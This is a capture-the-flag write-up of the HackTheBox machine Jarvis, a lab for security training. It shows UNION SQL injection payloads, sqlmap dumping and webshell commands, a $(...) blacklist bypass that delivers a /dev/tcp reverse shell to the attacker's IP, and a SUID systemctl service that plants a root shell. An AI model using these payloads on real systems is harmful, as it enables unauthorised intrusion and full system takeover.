---
toc: true
comments: true
title: HackTheBox - Jarvis
layout: post
title: HackTheBox - Jarvis
date: 2024-06-25 18:28 -0300
categories: [HackTheBox, Medium, CTF]
tags: [Linux, SQL Injection, sqlmap, phpMyAdmin, Command Injection, systemctl, SUID, PrivEsc]    
image: /assets/Posts/Jarvis/logo.png
---

## Pre
- Jarvis is our first Medium box and our first proper **SQL injection**. I'll show the manual approach first (because understanding UNION injection is non-negotiable) and then the `sqlmap` shortcut.
- The path after that is a lovely two-step escalation: bypassing a home-made input filter in a Python script, then abusing a **SUID `systemctl`**. Three distinct skills in one box.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
64999/tcp open  http    syn-ack
```

```shell
$ nmap -Pn -n -p 22,80,64999 -T4 -sSCV -A -oN nmap/versions $IP
22/tcp    open  ssh     OpenSSH 7.4p1 Debian
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

Port 64999 just returns a "you've been banned for 90s" message (a rate-limit rabbit hole – ignore it). The action is the *Stark Hotel* site on port 80. Browsing rooms, the URL is:

```url
http://10.10.10.143/room.php?cod=1
```

That `cod` parameter screams SQL injection.

## Phase 2: SQL injection (manual first)
We confirm the injection and find the column count with `ORDER BY`:

```url
room.php?cod=1 ORDER BY 7-- -   → OK
room.php?cod=1 ORDER BY 8-- -   → error
```

Seven columns. Now a UNION to find which columns are reflected on the page:

```url
room.php?cod=0 UNION SELECT 1,2,3,4,5,6,7-- -
```

The numbers 2, 3, 4, 5 render on the page. We use them to pull database info:

```url
room.php?cod=0 UNION SELECT 1,@@version,3,user(),5,database(),7-- -
```

That's the manual proof. From here, dumping every table by hand is tedious, so this is exactly where `sqlmap` earns its keep:

```shell
$ sqlmap -u "http://10.10.10.143/room.php?cod=1" --batch --dbs
$ sqlmap -u "http://10.10.10.143/room.php?cod=1" --batch -D hotel --dump
```

We recover a **phpMyAdmin** admin credential (`DBadmin` : a bcrypt hash we crack, or the plaintext found in the dump). But the faster, more educational route is `sqlmap`'s `--os-shell`, which uses the injection to write a PHP webshell into the web root and gives us command execution as `www-data`:

```shell
$ sqlmap -u "http://10.10.10.143/room.php?cod=1" --batch --os-shell
os-shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We upgrade to a real reverse shell and stabilise it as usual.

> `--os-shell` only works when the DB user can write files (`FILE` privilege) and you know a writable web-served directory. On Jarvis both hold, which is why it's the intended fast path. Always understand *why* an automated feature succeeds.
{: .prompt-info }

## Phase 3: Filter bypass → user pepper
`sudo -l` shows `www-data` can run a script as the user **pepper**:

```shell
www-data@jarvis:/$ sudo -l
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

Reading `simpler.py`, it has a "ping a host" feature that builds `ping -c 1 <input>` and passes it to the shell. It tries to be safe with a blacklist:

```python
forbidden = ['&', ';', '-', '`', '||', '|']
```

Notice what's **not** on the list: command substitution with `$(...)`. That's our bypass. We run the script and feed it a substitution that spawns a shell:

```shell
www-data@jarvis:/$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(bash -c 'bash -i >& /dev/tcp/10.10.14.7/5555 0>&1')
```

Our listener catches a shell as `pepper`, and the user flag is in their home directory.

## Phase 4: SUID systemctl → root
As pepper, we hunt for SUID binaries:

```shell
pepper@jarvis:~$ find / -perm -4000 -type f 2>/dev/null
/bin/systemctl
```

`systemctl` running SUID is a gift. [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#suid) shows we can define a malicious systemd service that runs a command as root, then start it. We'll have it copy a root shell:

```shell
pepper@jarvis:~$ TF=$(mktemp).service
pepper@jarvis:~$ cat > $TF <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
[Install]
WantedBy=multi-user.target
EOF
pepper@jarvis:~$ /bin/systemctl link $TF
pepper@jarvis:~$ /bin/systemctl enable --now $TF
pepper@jarvis:~$ /tmp/rootbash -p
rootbash-4.4# id
uid=1000(pepper) euid=0(root)
```

The `-p` on our SUID bash preserves the effective root UID, and we're done.

## Conclusions
- Jarvis is a great "web-to-root" tour: SQL injection (manual UNION and `sqlmap --os-shell`), a blacklist bypass via `$(...)` command substitution, and a SUID `systemctl` escalation.
- The recurring theme is **blacklists are not a security control**. The `simpler.py` author forgot `$(...)`; attackers only need to find one gap.
- Manual SQLi first, automation second – if you can't do it by hand you won't understand sqlmap's output or its failures.
- Next we exploit server-side template injection on [Doctor](/posts/hackthebox-doctor/).

_Keep hacking_  🙈🙉🙊
